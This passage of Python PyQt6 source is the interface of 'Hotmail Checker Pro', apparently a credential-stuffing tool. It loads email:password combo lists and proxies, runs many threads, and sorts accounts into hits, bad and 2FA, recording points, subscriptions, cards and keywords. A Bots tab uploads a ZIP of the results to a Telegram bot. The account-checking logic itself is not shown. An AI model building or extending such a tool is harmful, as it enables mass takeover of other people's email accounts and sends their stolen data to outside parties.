                QMessageBox.warning(self,"Export",str(e))
        elif fmt=="pdf":
            p,_=QFileDialog.getSaveFileName(self,"Export HTML Report","report.html","HTML (*.html)")
            if not p: return
            self._export_html(rows,p)
            webbrowser.open(p)
            QMessageBox.information(self,"Export",f"HTML report saved → {p}\nPrint to PDF from browser.")

    def _export_html(self,rows:List[Row],path:str):
        hdr="".join(f"<th>{h}</th>" for h in ["ID","Email","Name","Country","Status","Points","Subs","Card","Keywords"])
        body=""
        for r in rows:
            cls="hit" if r.status=="HIT" else "bad" if r.status=="BAD" else "tfa" if r.status=="2FA" else ""
            body+=f'<tr class="{cls}"><td>{r.rid}</td><td>{r.combo}</td><td>{r.name}</td>'
            body+=f'<td>{r.cc}</td><td>{r.status}</td><td>{r.points or ""}</td>'
            body+=f'<td>{r.subs}</td><td>{r.card}</td><td>{r.kw_str}</td></tr>'
        html=f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Hotmail Results</title><style>
body{{font-family:Arial;background:#0d1117;color:#e6edf3;}}
table{{border-collapse:collapse;width:100%;font-size:12px;}}
th{{background:#161b22;color:#8b949e;padding:8px;text-align:left;border-bottom:1px solid #21262d;}}
td{{padding:6px 8px;border-bottom:1px solid #21262d;}}
tr.hit{{background:#091a0d;}} tr.bad{{background:#160505;}} tr.tfa{{background:#1a1505;}}
tr:hover{{background:#1f3a5f;}}
</style></head><body><h2 style="color:#0078d4">Hotmail Results — {datetime.now():%d/%m/%Y %H:%M}</h2>
<table><thead><tr>{hdr}</tr></thead><tbody>{body}</tbody></table></body></html>"""
        Path(path).write_text(html,encoding='utf-8')

    def retranslate(self):
        self._acc_lbl.setText(t("no_acc"))
        self._btn_load.setText(t("load_file")); self._btn_paste.setText(t("paste"))
        self._btn_clear.setText(t("clear")); self._btn_lp.setText(t("load_pasted"))
        self._paste_box.setPlaceholderText(t("paste_ph"))
        self._btn_txt.setText(t("export_txt")); self._btn_xls.setText(t("export_xls"))
        self._btn_pdf.setText(t("export_pdf"))
        self.filter_bar.retranslate()
        self._src.refresh_headers()

    def _toggle_combo_col(self):
        hidden=self.table.isColumnHidden(C_COMBO)
        self.table.setColumnHidden(C_COMBO,not hidden)

    def _update_sel_count(self):
        n=len(self.table.selectionModel().selectedRows())
        self._sb_sel.setText(f"Selected: {n}" if n else "Selected: 0")

    def update_statusbar(self,total:int,stats=None):
        self._sb_total.setText(f"Total accounts: {total}")
        if stats:
            self._sb_access.setText(f"Access: {stats.hits}")
            self._sb_2fa.setText(f"2FA: {stats.two_fa}")
            self._sb_wrong.setText(f"Wrong: {stats.bad}")


# ══════════════════════════════════════════════════════════════════════
#  PROXY TAB
# ══════════════════════════════════════════════════════════════════════
class ProxyTab(QWidget):
    _BTN_ADD  = f"""QPushButton{{background:#0078d4;color:#fff;border:none;border-radius:7px;padding:6px 18px;font-weight:bold;font-size:12px;}}
                    QPushButton:hover{{background:#1a8fe3;}} QPushButton:pressed{{background:#005fa3;}}"""
    _BTN_REM  = f"""QPushButton{{background:#c0392b;color:#fff;border:none;border-radius:7px;padding:6px 18px;font-weight:bold;font-size:12px;}}
                    QPushButton:hover{{background:#e74c3c;}} QPushButton:pressed{{background:#96281b;}}"""
    _BTN_CHK  = f"""QPushButton{{background:#1a7f40;color:#fff;border:none;border-radius:7px;padding:6px 18px;font-weight:bold;font-size:12px;}}
                    QPushButton:hover{{background:#27ae60;}} QPushButton:pressed{{background:#145a2e;}}"""
    _BTN_CLR  = f"""QPushButton{{background:#2c2c2c;color:#e74c3c;border:1px solid #e74c3c;border-radius:7px;padding:6px 14px;font-size:12px;}}
                    QPushButton:hover{{background:#3a1010;color:#ff6b63;}}"""
    _BTN_LOAD = f"""QPushButton{{background:#1c2128;color:#8b949e;border:1px solid #30363d;border-radius:7px;padding:6px 10px;font-size:13px;}}
                    QPushButton:hover{{background:#21262d;color:#e6edf3;}}"""

    def __init__(self,parent=None):
        super().__init__(parent)
        self._proxies: List[str]=[]
        self._statuses: List[str]=[]
        lo=QVBoxLayout(self); lo.setContentsMargins(24,24,24,24); lo.setSpacing(16)

        # Header row
        hdr=QHBoxLayout(); hdr.setSpacing(12)
        ttl=QLabel("PROXY MANAGER"); ttl.setObjectName("dim")
        ttl.setFont(QFont("Segoe UI",12,QFont.Weight.Bold)); hdr.addWidget(ttl)
        hdr.addStretch()
        self.use_chk=QCheckBox(t("proxy_use")); self.use_chk.setProperty("i18n_key","proxy_use")
        hdr.addWidget(self.use_chk); lo.addLayout(hdr)

        # Input row
        inp=QHBoxLayout(); inp.setSpacing(8)
        self._inp=QLineEdit()
        self._inp.setPlaceholderText("IP:PORT   or   IP:PORT:USER:PASS")
        self._inp.setFixedHeight(36); inp.addWidget(self._inp,1)
        self._btn_add=QPushButton("＋  Add")
        self._btn_add.setFixedHeight(36); self._btn_add.setMinimumWidth(90)
        self._btn_add.setStyleSheet(self._BTN_ADD)
        self._btn_add.setCursor(Qt.CursorShape.PointingHandCursor)
        self._btn_add.clicked.connect(self._add); inp.addWidget(self._btn_add)
        self._btn_load_file=QPushButton("📂")
        self._btn_load_file.setFixedSize(36,36)
        self._btn_load_file.setStyleSheet(self._BTN_LOAD)
        self._btn_load_file.setCursor(Qt.CursorShape.PointingHandCursor)
        self._btn_load_file.clicked.connect(self._load_file); inp.addWidget(self._btn_load_file)
        lo.addLayout(inp)

        # Proxy list
        self.lst=QListWidget()
        self.lst.setFont(QFont("Consolas",10))
        self.lst.setStyleSheet(f"""
            QListWidget{{background:#0f1419;border:1px solid #21262d;border-radius:8px;outline:none;}}
            QListWidget::item{{padding:7px 12px;border-bottom:1px solid #1c2128;color:#e6edf3;}}
            QListWidget::item:selected{{background:#1a3050;color:#e6edf3;}}
            QListWidget::item:hover{{background:#161f2e;}}
        """)
        lo.addWidget(self.lst,1)

        # Action buttons
        btn_row=QHBoxLayout(); btn_row.setSpacing(10)
        self._btn_rem=QPushButton("✕  Remove")
        self._btn_rem.setFixedHeight(36); self._btn_rem.setMinimumWidth(100)
        self._btn_rem.setStyleSheet(self._BTN_REM)
        self._btn_rem.setCursor(Qt.CursorShape.PointingHandCursor)
        self._btn_rem.clicked.connect(self._remove); btn_row.addWidget(self._btn_rem)
        self._btn_chk=QPushButton("⚡  Check All")
        self._btn_chk.setFixedHeight(36); self._btn_chk.setMinimumWidth(110)
        self._btn_chk.setStyleSheet(self._BTN_CHK)
        self._btn_chk.setCursor(Qt.CursorShape.PointingHandCursor)
        self._btn_chk.clicked.connect(self._check_all); btn_row.addWidget(self._btn_chk)
        self._btn_clr=QPushButton("🗑  Clear")
        self._btn_clr.setFixedHeight(36); self._btn_clr.setMinimumWidth(90)
        self._btn_clr.setStyleSheet(self._BTN_CLR)
        self._btn_clr.setCursor(Qt.CursorShape.PointingHandCursor)
        self._btn_clr.clicked.connect(self._clear); btn_row.addWidget(self._btn_clr)
        btn_row.addStretch()
        self._lbl_count=QLabel("0 proxies")
        self._lbl_count.setStyleSheet(f"color:{C_DIM};font-size:12px;")
        btn_row.addWidget(self._lbl_count)
        lo.addLayout(btn_row)

        self._worker: Optional[ProxyCheckWorker]=None

    def _add(self):
        line=self._inp.text().strip()
        if line and line not in self._proxies:
            self._proxies.append(line); self._statuses.append("")
            self._refresh_list(); self._inp.clear()

    def _load_file(self):
        p,_=QFileDialog.getOpenFileName(self,"Load proxies","","Text (*.txt);;All (*)")
        if not p: return
        for enc in ('utf-8','latin-1','cp1252'):
            try:
                lines=Path(p).read_text(encoding=enc,errors='replace').splitlines()
                for l in lines:
                    l=l.strip()
                    if l and l not in self._proxies:
                        self._proxies.append(l); self._statuses.append("")
                self._refresh_list(); return
            except Exception: continue

    def _remove(self):
        for item in self.lst.selectedItems():
            row=self.lst.row(item)
            if 0<=row<len(self._proxies):
                self._proxies.pop(row); self._statuses.pop(row)
        self._refresh_list()

    def _clear(self):
        self._proxies.clear(); self._statuses.clear(); self.lst.clear()
        self._lbl_count.setText("0 proxies")

    def _refresh_list(self):
        self.lst.clear()
        for i,(p,s) in enumerate(zip(self._proxies,self._statuses)):
            label=f"  {p}"
            if s=="LIVE":   label=f"✓  {p}"
            elif s=="DEAD": label=f"✗  {p}"
            elif s=="INVALID": label=f"?  {p}"
            item=QListWidgetItem(label)
            if s=="LIVE": item.setForeground(QColor(C_HIT))
            elif s=="DEAD": item.setForeground(QColor(C_BAD))
            elif s=="INVALID": item.setForeground(QColor(C_DIMMER))
            self.lst.addItem(item)
        self._lbl_count.setText(f"{len(self._proxies)} proxies")

    def _check_all(self):
        if not self._proxies: return
        if self._worker and self._worker.isRunning(): return
        self._statuses=["…"]*len(self._proxies); self._refresh_list()
        self._worker=ProxyCheckWorker(list(self._proxies))
        self._worker.result_sig.connect(self._on_proxy_result)
        self._worker.done_sig.connect(lambda: self._btn_chk.setEnabled(True))
        self._btn_chk.setEnabled(False); self._worker.start()

    def _on_proxy_result(self,i:int,status:str):
        if 0<=i<len(self._statuses):
            self._statuses[i]=status; self._refresh_list()

    @property
    def proxy_list(self) -> List[str]: return list(self._proxies)
    @property
    def use_proxy(self) -> bool: return self.use_chk.isChecked()

    def retranslate(self):
        self.use_chk.setText(t("proxy_use"))


# ══════════════════════════════════════════════════════════════════════
#  FILE MANAGER TAB
# ══════════════════════════════════════════════════════════════════════
class FileManagerTab(QWidget):
    def __init__(self,parent=None):
        super().__init__(parent)
        lo=QVBoxLayout(self); lo.setContentsMargins(20,20,20,20); lo.setSpacing(12)

        ttl=QLabel("FILE MANAGER"); ttl.setObjectName("dim")
        ttl.setFont(QFont("Segoe UI",11,QFont.Weight.Bold)); lo.addWidget(ttl)

        # Output folder picker
        row=QHBoxLayout(); row.setSpacing(8)
        lbl=QLabel("Output:"); lbl.setStyleSheet(f"color:{C_DIM};"); row.addWidget(lbl)
        self.out_edit=QLineEdit(str(Path.cwd())); self.out_edit.setFixedHeight(30); row.addWidget(self.out_edit)
        self._btn_browse=QPushButton("Browse…"); self._btn_browse.setFixedHeight(30)
        self._btn_browse.setCursor(Qt.CursorShape.PointingHandCursor)
        self._btn_browse.clicked.connect(self._browse); row.addWidget(self._btn_browse)
        lo.addLayout(row)

        # Saved sessions list
        self.lst=QListWidget(); lo.addWidget(self.lst,1)

        btn_row=QHBoxLayout(); btn_row.setSpacing(8)
        self._btn_refresh=QPushButton("🔄 Refresh"); self._btn_refresh.setFixedHeight(30)
        self._btn_refresh.setCursor(Qt.CursorShape.PointingHandCursor)
        self._btn_refresh.clicked.connect(self.refresh); btn_row.addWidget(self._btn_refresh)
        self._btn_open=QPushButton("📁 Open Folder"); self._btn_open.setFixedHeight(30)
        self._btn_open.setCursor(Qt.CursorShape.PointingHandCursor)
        self._btn_open.clicked.connect(self._open_folder); btn_row.addWidget(self._btn_open)
        btn_row.addStretch(); lo.addLayout(btn_row)

        self.refresh()

    def _browse(self):
        d=QFileDialog.getExistingDirectory(self,"Output folder")
        if d: self.out_edit.setText(d); self.refresh()

    def refresh(self):
        self.lst.clear()
        base=Path(self.out_edit.text().strip() or '.')
        folders=sorted([f for f in base.glob("Results-*") if f.is_dir()],reverse=True)
        for folder in folders:
            hits=0; bad=0; tfa=0
            hf=folder/"Hits.txt"; bf=folder/"Bad.txt"; tf=folder/"2fa.txt"
            try:
                if hf.exists(): hits=sum(1 for l in hf.read_text(encoding='utf-8').splitlines() if l.strip())
            except Exception: pass
            try:
                if bf.exists(): bad=sum(1 for l in bf.read_text(encoding='utf-8').splitlines() if l.strip())
            except Exception: pass
            try:
                if tf.exists(): tfa=sum(1 for l in tf.read_text(encoding='utf-8').splitlines() if l.strip())
            except Exception: pass
            item=QListWidgetItem(f"  📂 {folder.name}    ✓ {hits} hits  ✗ {bad} bad  ⚠ {tfa} 2fa")
            item.setData(Qt.ItemDataRole.UserRole,str(folder))
            self.lst.addItem(item)
        if not folders:
            self.lst.addItem(QListWidgetItem("  No result folders found."))

    def _open_folder(self):
        item=self.lst.currentItem()
        if item:
            p=item.data(Qt.ItemDataRole.UserRole)
            if p and Path(p).exists():
                webbrowser.open(p)

    @property
    def output_folder(self) -> str: return self.out_edit.text().strip() or str(Path.cwd())


# ══════════════════════════════════════════════════════════════════════
#  BOTS TAB
# ══════════════════════════════════════════════════════════════════════
class BotsTab(QWidget):
    def __init__(self,parent=None):
        super().__init__(parent)
        lo=QVBoxLayout(self); lo.setContentsMargins(28,28,28,28); lo.setSpacing(20)

        ttl=QLabel("BOTS & AUTOMATION")
        ttl.setFont(QFont("Segoe UI",13,QFont.Weight.Bold))
        ttl.setStyleSheet(f"color:{C_TEXT};letter-spacing:2px;"); lo.addWidget(ttl)
        sub=QLabel("Auto-send results to your Telegram bot when checking completes")
        sub.setStyleSheet(f"color:{C_DIM};font-size:11px;"); lo.addWidget(sub)
        lo.addWidget(_sep())

        # ─ Telegram Card
        tg=QFrame(); tg.setObjectName("card")
        tg_lo=QVBoxLayout(tg); tg_lo.setContentsMargins(22,18,22,18); tg_lo.setSpacing(14)

        # Header row
        h_row=QHBoxLayout()
        tg_lbl=QLabel("✈  TELEGRAM BOT")
        tg_lbl.setFont(QFont("Segoe UI",11,QFont.Weight.Bold))
        tg_lbl.setStyleSheet(f"color:{C_TEXT};"); h_row.addWidget(tg_lbl); h_row.addStretch()

        self._tg_toggle=QPushButton("OFF")
        self._tg_toggle.setCheckable(True); self._tg_toggle.setFixedSize(64,28)
        self._tg_toggle.setStyleSheet(
            f"QPushButton{{background:{C_PANEL2};color:{C_DIM};border:1px solid {C_BORDER};"
            f"border-radius:14px;font-weight:bold;font-size:11px;}}"
            f"QPushButton:checked{{background:{C_HIT};color:#fff;border-color:{C_HIT};}}"
        )
        self._tg_toggle.toggled.connect(self._on_tg_toggle)
        h_row.addWidget(self._tg_toggle); tg_lo.addLayout(h_row)

        # Config (hidden by default)
        self._tg_cfg=QWidget(); self._tg_cfg.setVisible(False)
        cfg=QVBoxLayout(self._tg_cfg); cfg.setContentsMargins(0,0,0,0); cfg.setSpacing(10)

        lbl_tok=QLabel("Bot Token")
        lbl_tok.setStyleSheet(f"color:{C_DIM};font-size:11px;font-weight:bold;"); cfg.addWidget(lbl_tok)
        self._tg_token=QLineEdit()
        self._tg_token.setPlaceholderText("123456789:ABCdefGhIjKlMnOpQrStUvWxYz...")
        self._tg_token.setFixedHeight(34); self._tg_token.setEchoMode(QLineEdit.EchoMode.Password)
        cfg.addWidget(self._tg_token)

        lbl_cid=QLabel("Chat ID")
        lbl_cid.setStyleSheet(f"color:{C_DIM};font-size:11px;font-weight:bold;"); cfg.addWidget(lbl_cid)
        self._tg_chat=QLineEdit()
        self._tg_chat.setPlaceholderText("-100123456789  or  @your_channel")
        self._tg_chat.setFixedHeight(34); cfg.addWidget(self._tg_chat)

        self._tg_auto=QCheckBox("Auto-send ZIP when checking completes")
        self._tg_auto.setStyleSheet(f"color:{C_TEXT};font-size:12px;"); cfg.addWidget(self._tg_auto)

        btn_r=QHBoxLayout(); btn_r.setSpacing(10)
        self._btn_tg_test=QPushButton("🚀  Test Send")
        self._btn_tg_test.setObjectName("accent"); self._btn_tg_test.setFixedHeight(34)
        self._btn_tg_test.setCursor(Qt.CursorShape.PointingHandCursor)
        self._btn_tg_test.clicked.connect(self._tg_test); btn_r.addWidget(self._btn_tg_test)
        btn_r.addStretch(); cfg.addLayout(btn_r)
        self._tg_status=QLabel("")
        self._tg_status.setStyleSheet(f"color:{C_DIM};font-size:11px;"); cfg.addWidget(self._tg_status)
        tg_lo.addWidget(self._tg_cfg)
        lo.addWidget(tg); lo.addStretch()

    def _on_tg_toggle(self,on:bool):
        self._tg_toggle.setText("ON" if on else "OFF")
        self._tg_cfg.setVisible(on)

    def _tg_test(self):
        tok=self._tg_token.text().strip(); cid=self._tg_chat.text().strip()
        if not tok or not cid:
            self._tg_status.setText("⚠  Enter Bot Token and Chat ID first"); return
        self._tg_status.setText("⏳  Sending test message...")
        import threading
        def _do():
            try:
                import requests as _rq
                r=_rq.post(f"https://api.telegram.org/bot{tok}/sendMessage",
                    json={"chat_id":cid,"text":"🔵 Hotmail Checker Pro — connection OK!"},timeout=10)
                msg="✅  Connected!" if r.status_code==200 else f"❌  Error {r.status_code}: {r.json().get('description','')}"
            except Exception as e:
                msg=f"❌  {e}"
            from PyQt6.QtCore import QMetaObject,Q_ARG
            QMetaObject.invokeMethod(self._tg_status,"setText",Qt.ConnectionType.QueuedConnection,Q_ARG(str,msg))
        threading.Thread(target=_do,daemon=True).start()

    def send_zip(self,zip_path:str):
        """Call this after checking done if auto-send is enabled."""
        if not self._tg_toggle.isChecked() or not self._tg_auto.isChecked(): return
        tok=self._tg_token.text().strip(); cid=self._tg_chat.text().strip()
        if not tok or not cid: return
        import threading
        def _do():
            try:
                import requests as _rq
                with open(zip_path,'rb') as f:
                    _rq.post(f"https://api.telegram.org/bot{tok}/sendDocument",
                        data={"chat_id":cid,"caption":"📦 Hotmail Checker Results"},
                        files={"document":f},timeout=30)
            except Exception: pass
        threading.Thread(target=_do,daemon=True).start()

    @property
    def tg_enabled(self)->bool: return self._tg_toggle.isChecked() and self._tg_auto.isChecked()


# ══════════════════════════════════════════════════════════════════════
#  SIDEBAR
# ══════════════════════════════════════════════════════════════════════
class Sidebar(QFrame):
    start_sig    = pyqtSignal()
    stop_sig     = pyqtSignal()
    mode_changed = pyqtSignal(int)

    def __init__(self,parent=None):
        super().__init__(parent)
        self.setObjectName("sidebar"); self.setFixedWidth(216)
        root=QVBoxLayout(self); root.setContentsMargins(0,0,0,0); root.setSpacing(0)

        # Logo
        lw=QWidget(); lw.setStyleSheet("background:transparent;")
        ll=QHBoxLayout(lw); ll.setContentsMargins(10,12,10,10); ll.setSpacing(10)
        ico=QLabel()
        import os as _os
        _lp=_os.path.join(_os.path.dirname(_os.path.abspath(__file__)),"logo","logo.jpeg")
        pix=QPixmap(_lp)
        if not pix.isNull():
            ico.setPixmap(pix.scaled(44,44,Qt.AspectRatioMode.KeepAspectRatio,Qt.TransformationMode.SmoothTransformation))
        else:
            ico.setText("✉"); ico.setFont(QFont("Segoe UI",22))
            ico.setStyleSheet(f"color:{C_ACCENT};")
        ico.setFixedSize(46,46); ll.addWidget(ico)
        ttl=QLabel("Hotmail\nChecker Pro")
        ttl.setFont(QFont("Segoe UI",10,QFont.Weight.Bold))
        ttl.setStyleSheet(f"color:{C_TEXT}; background:transparent;")
        ll.addWidget(ttl); ll.addStretch()
        root.addWidget(lw); root.addWidget(_sep())

        # Scroll area for settings
        scroll=QScrollArea(); scroll.setWidgetResizable(True)
        scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        scroll.setStyleSheet("background:transparent; border:none;")
        inner=QWidget(); inner.setStyleSheet("background:transparent;")
        self._inner=inner
        il=QVBoxLayout(inner); il.setContentsMargins(12,8,12,8); il.setSpacing(4)

        # Language
        il.addWidget(_slbl("language"))
        self.lang_combo=QComboBox()
        self.lang_combo.addItems(["🇺🇸  English","🇻🇳  Tiếng Việt","🇨🇳  中文"])
        self.lang_combo.currentIndexChanged.connect(self._on_lang)
        il.addWidget(self.lang_combo); il.addWidget(_sep())

        # Mode
        self._mode_lbl=_slbl("mode"); il.addWidget(self._mode_lbl)
        self.mode_combo=QComboBox()
        self.mode_combo.addItems(_MODES_EN)
        self.mode_combo.currentIndexChanged.connect(lambda i: self.mode_changed.emit(i+1))
        il.addWidget(self.mode_combo); il.addWidget(_sep())

        # Threads
        self._thr_lbl=_slbl("threads"); il.addWidget(self._thr_lbl)
        tr=QHBoxLayout(); tr.setSpacing(6)
        self.thr_slider=QSlider(Qt.Orientation.Horizontal)
        self.thr_slider.setRange(1,50); self.thr_slider.setValue(10)
        self._thr_num=QLabel("10"); self._thr_num.setFixedWidth(28)
        self._thr_num.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self._thr_num.setStyleSheet(f"color:{C_ACCENT};font-weight:bold;font-size:13px;background:transparent;")
        self.thr_slider.valueChanged.connect(lambda v: self._thr_num.setText(str(v)))
        tr.addWidget(self.thr_slider); tr.addWidget(self._thr_num)
        il.addLayout(tr); il.addWidget(_sep())

        # Keywords
        self._kw_lbl=_slbl("keywords"); il.addWidget(self._kw_lbl)
        self.kw_box=QTextEdit(); self.kw_box.setFixedHeight(76)
        self.kw_box.setPlaceholderText(t("kw_ph")); il.addWidget(self.kw_box)
        self.btn_kw=QPushButton(t("load_kw")); self.btn_kw.setProperty("i18n_key","load_kw")
        self.btn_kw.setCursor(Qt.CursorShape.PointingHandCursor)
        self.btn_kw.clicked.connect(self._load_kw); il.addWidget(self.btn_kw); il.addWidget(_sep())

        self.debug_chk=QCheckBox(t("debug")); self.debug_chk.setProperty("i18n_key","debug")
        il.addWidget(self.debug_chk); il.addStretch()
        scroll.setWidget(inner); root.addWidget(scroll); root.addWidget(_sep())

        # Start / Stop
        ba=QWidget(); ba.setStyleSheet("background:transparent;")
        bl=QVBoxLayout(ba); bl.setContentsMargins(12,10,12,10); bl.setSpacing(6)
        self.btn_start=QPushButton(t("start")); self.btn_start.setObjectName("btn_start")
        self.btn_start.setFixedHeight(40); self.btn_start.setCursor(Qt.CursorShape.PointingHandCursor)
        self.btn_start.clicked.connect(self.start_sig)
        self.btn_stop=QPushButton(t("stop")); self.btn_stop.setObjectName("btn_stop")
        self.btn_stop.setFixedHeight(40); self.btn_stop.setEnabled(False)
        self.btn_stop.setCursor(Qt.CursorShape.PointingHandCursor)
        self.btn_stop.clicked.connect(self.stop_sig)
        bl.addWidget(self.btn_start); bl.addWidget(self.btn_stop)
        root.addWidget(ba)

        # Founder
        fw=QWidget(); fw.setStyleSheet(f"background:{C_PANEL2};border-top:1px solid {C_BORDER};")
        fl=QVBoxLayout(fw); fl.setContentsMargins(12,5,12,4); fl.setSpacing(1)
        fd=QLabel("FOUNDER"); fd.setObjectName("dim"); fd.setAlignment(Qt.AlignmentFlag.AlignCenter)
        fl.addWidget(fd)
        for handle,url in [("@thaituduc","https://t.me/thaituduc"),
                            ("@thaituluckkystopdz","https://t.me/thaituluckkystopdz")]:
            btn=QPushButton(handle); btn.setObjectName("founder")
            btn.setCursor(Qt.CursorShape.PointingHandCursor)
            btn.clicked.connect(lambda _,u=url: webbrowser.open(u))
            fl.addWidget(btn,0,Qt.AlignmentFlag.AlignCenter)
        root.addWidget(fw)

        self._ver=QLabel(t("ver")); self._ver.setObjectName("dim")
        self._ver.setAlignment(Qt.AlignmentFlag.AlignCenter); self._ver.setContentsMargins(0,2,0,6)
        root.addWidget(self._ver)

    def _on_lang(self,idx):
        set_lang(["en","vi","cn"][idx] if idx<3 else "en")
        w=self.window()
        if hasattr(w,'retranslate'): w.retranslate()

    def _load_kw(self):
        p,_=QFileDialog.getOpenFileName(self,"Keywords","","Text (*.txt);;All Files (*)")
        if p:
            for enc in ('utf-8','utf-8-sig','latin-1','cp1252'):
                try: self.kw_box.setPlainText(Path(p).read_text(encoding=enc,errors='replace')); break
                except Exception: continue

    def set_running(self,v:bool):
        self.btn_start.setEnabled(not v); self.btn_stop.setEnabled(v)
        self.mode_combo.setEnabled(not v)

    def retranslate(self):
        self.btn_start.setText(t("start")); self.btn_stop.setText(t("stop"))
        self.btn_kw.setText(t("load_kw")); self.debug_chk.setText(t("debug"))
        self._ver.setText(t("ver")); self.kw_box.setPlaceholderText(t("kw_ph"))
        cur=self.mode_combo.currentIndex(); self.mode_combo.blockSignals(True)
        modes=[_MODES_EN,_MODES_VI,_MODES_CN][["en","vi","cn"].index(_lang) if _lang in ("en","vi","cn") else 0]
        self.mode_combo.clear(); self.mode_combo.addItems(modes)
        self.mode_combo.setCurrentIndex(cur); self.mode_combo.blockSignals(False)
        for w in self._inner.findChildren(QLabel):
            k=w.property("i18n_key")
            if k: w.setText(t(k))
        for w in self._inner.findChildren(QPushButton):
            k=w.property("i18n_key")
            if k: w.setText(t(k))
        for w in self._inner.findChildren(QCheckBox):
            k=w.property("i18n_key")
            if k: w.setText(t(k))

    @property
    def mode(self)->int: return self.mode_combo.currentIndex()+1
    @property
    def threads(self)->int: return self.thr_slider.value()
    @property
    def keywords(self)->List[str]:
        return [k.strip() for k in self.kw_box.toPlainText().splitlines() if k.strip()]
    @property
    def debug(self)->bool: return self.debug_chk.isChecked()


# ══════════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════════
def _parse_combos(lines:List[str])->List[str]:
    return [l.strip() for l in lines if ':' in l.strip() and len(l.strip())>3]


# ══════════════════════════════════════════════════════════════════════
#  MAIN WINDOW
# ══════════════════════════════════════════════════════════════════════
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle(t("app")); self.resize(1420,880); self.setMinimumSize(1080,680)
        self._accounts: List[str]=[]
        self._worker: Optional[WorkerThread]=None
        self._stats: Optional[Stats]=None
        self._current_mode=1

        # Models
        self._src_model=AccountModel()
        self._filter_model=FilterModel()
        self._filter_model.setSourceModel(self._src_model)

        self._build()

        self._stats_tmr=QTimer(self)
        self._stats_tmr.setInterval(400)
        self._stats_tmr.timeout.connect(self._tick_stats)

    # ── build ──────────────────────────────────────────────────────
    def _build(self):
        cw=QWidget(); self.setCentralWidget(cw)
        root=QHBoxLayout(cw); root.setContentsMargins(0,0,0,0); root.setSpacing(0)

        self.sidebar=Sidebar()
        self.sidebar.start_sig.connect(self._start)
        self.sidebar.stop_sig.connect(self._stop)
        self.sidebar.mode_changed.connect(self._on_mode_change)
        root.addWidget(self.sidebar)

        right=QWidget(); rl=QVBoxLayout(right); rl.setContentsMargins(0,0,0,0); rl.setSpacing(0)
        rl.addWidget(self._mk_topbar())
        rl.addWidget(self._mk_nav_bar())

        self._stack=QStackedWidget()
        self._dash=DashboardTab()
        self._checker=CheckerTab(self._src_model,self._filter_model)
        self._proxy=ProxyTab()
        self._files=FileManagerTab()

        for w in (self._dash,self._checker,self._proxy,self._files):
            self._stack.addWidget(w)

        rl.addWidget(self._stack,1)
        root.addWidget(right,1)

        # Wire checker buttons
        self._checker._btn_load.clicked.connect(self._load_file)
        self._checker._btn_clear.clicked.connect(self._clear_all)

        self._switch_tab(0)
        self._checker.apply_mode_cols(1)

    def _mk_topbar(self)->QFrame:
        bar=QFrame(); bar.setObjectName("topbar"); bar.setFixedHeight(50)
        lo=QHBoxLayout(bar); lo.setContentsMargins(18,0,18,0); lo.setSpacing(0)
        self._topbar_lbl=QLabel(t("app").upper())
        f=QFont("Segoe UI",12,QFont.Weight.Bold)
        f.setLetterSpacing(QFont.SpacingType.AbsoluteSpacing,0.5)
        self._topbar_lbl.setFont(f); lo.addWidget(self._topbar_lbl); lo.addStretch()
        self._mode_badge=QLabel("MODE 1")
        self._mode_badge.setStyleSheet(
            f"background:{C_ACCENT};color:#fff;border-radius:4px;padding:2px 10px;font-weight:bold;")
        lo.addWidget(self._mode_badge); lo.addSpacing(14)
        self._status_lbl=QLabel(t("idle"))
        self._status_lbl.setStyleSheet(f"color:{C_DIM};"); lo.addWidget(self._status_lbl)
        return bar

    def _mk_nav_bar(self)->QWidget:
        bar=QWidget(); bar.setFixedHeight(40)
        bar.setStyleSheet(f"background:{C_PANEL2}; border-bottom:1px solid {C_BORDER};")
        lo=QHBoxLayout(bar); lo.setContentsMargins(12,0,12,0); lo.setSpacing(2)
        self._nav_btns: List[QPushButton]=[]
        for i,key in enumerate(["tab_dash","tab_checker","tab_proxy","tab_files"]):
            btn=QPushButton(t(key)); btn.setObjectName("nav_btn")
            btn.setCheckable(True); btn.setProperty("i18n_key",key)
            btn.setCursor(Qt.CursorShape.PointingHandCursor)
            btn.setFixedHeight(34)
            btn.clicked.connect(lambda _,idx=i: self._switch_tab(idx))
            self._nav_btns.append(btn); lo.addWidget(btn)
        lo.addStretch(); return bar

    def _switch_tab(self,idx:int):
        self._stack.setCurrentIndex(idx)
        for i,btn in enumerate(self._nav_btns): btn.setChecked(i==idx)

    # ── mode ───────────────────────────────────────────────────────
    def _on_mode_change(self,mode:int):
        self._current_mode=mode
        self._checker.apply_mode_cols(mode)
        self._checker.filter_bar.set_kw_visible(mode in KW_MODES and self._src_model.any_kw())
        c=BADGE_CLR.get(mode,C_ACCENT)
        self._mode_badge.setText(f"MODE {mode}")
        self._mode_badge.setStyleSheet(
            f"background:{c};color:#fff;border-radius:4px;padding:2px 10px;font-weight:bold;")

    # ── account loading ────────────────────────────────────────────
    def _load_accounts(self,combos:List[str],src:str=""):
        self._accounts=combos; n=len(combos)
        label=f"{n} accounts" if not src else f"Loaded {n} from {src}"
        self._checker._acc_lbl.setText(label)
        self._src_model.clear(); self._src_model.add_rows(combos)
        self._dash.set_total(n)

    def _load_file(self):
        p,_=QFileDialog.getOpenFileName(self,"Load combo","","Text (*.txt);;All Files (*)")
        if not p: return
        for enc in ('utf-8','utf-8-sig','latin-1','cp1252'):
            try:
                lines=Path(p).read_text(encoding=enc,errors='replace').splitlines()
                combos=_parse_combos(lines)
                if combos: self._load_accounts(combos,Path(p).name); return
                else:
                    self._status_lbl.setText(f"No valid lines in {Path(p).name}"); return
            except Exception: continue
        self._status_lbl.setText(t("msg_load_err",e="decode failed"))

    def _clear_all(self):
        self._accounts=[]; self._src_model.clear()
        self._checker._acc_lbl.setText(t("no_acc"))
        self._dash.set_total(0); self._dash.progress.setValue(0)

    # ── start / stop ───────────────────────────────────────────────
    def _start(self):
        if not self._accounts:
            self._status_lbl.setText(t("msg_no_acc")); return
        if self._worker and self._worker.isRunning(): return

        mode=self.sidebar.mode; threads=self.sidebar.threads; debug=self.sidebar.debug
        kws=self.sidebar.keywords if mode in KW_MODES else []
        out=self._files.output_folder

        self._stats=Stats(); self._stats.total=len(self._accounts)
        rm=ResultManager(out)

        self._src_model.clear(); self._src_model.add_rows(self._accounts)
